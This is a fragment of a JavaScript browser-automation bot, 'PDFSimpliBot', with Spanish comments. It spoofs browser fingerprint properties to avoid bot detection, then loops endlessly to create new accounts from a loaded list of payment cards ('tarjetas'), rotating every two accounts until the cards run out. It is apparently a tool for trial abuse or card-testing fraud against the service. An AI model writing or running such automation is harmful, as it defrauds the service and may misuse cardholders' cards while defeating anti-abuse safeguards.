                Object.defineProperty(navigator, "plugins", { get: () => [1,2,3,4] });
                Object.defineProperty(navigator, "languages", { get: () => ["es-EC","es","en-US"] });
            });

            await this.log("♻️ Navegador reiniciado para nueva cuenta");

        } catch (e) {
            await this.log("❌ Error reiniciando navegador: " + e.message);
        }
    }

} // 👈 ESTE cierre **sí** es correcto, pertenece a la clase PDFSimpliBot

// =============================================================
// MAIN LOOP — CUENTAS INFINITAS CON ROTACIÓN CADA 2 CUENTAS
// =============================================================
(async () => {
    const bot = new PDFSimpliBot();
    await bot.loadAllTarjetas();
    await bot.initialize();

    try {
        while (true) {

            // 🔥 ROTACIÓN MANUAL SI TOCA (cada 2 cuentas)
            await bot.rotacionManualSiToca();

            const seguir = await bot.executeFlowCuenta();

            await bot.restartBrowser();   // ← AQUI MISMO

            if (!seguir) {
                await bot.log("🚫 No hay más tarjetas disponibles — BOT FINALIZADO.");
                break;
            }
        }
    } catch (e) {
        console.error("❌ ERROR GENERAL:", e.message);
    }

    await bot.close();
})();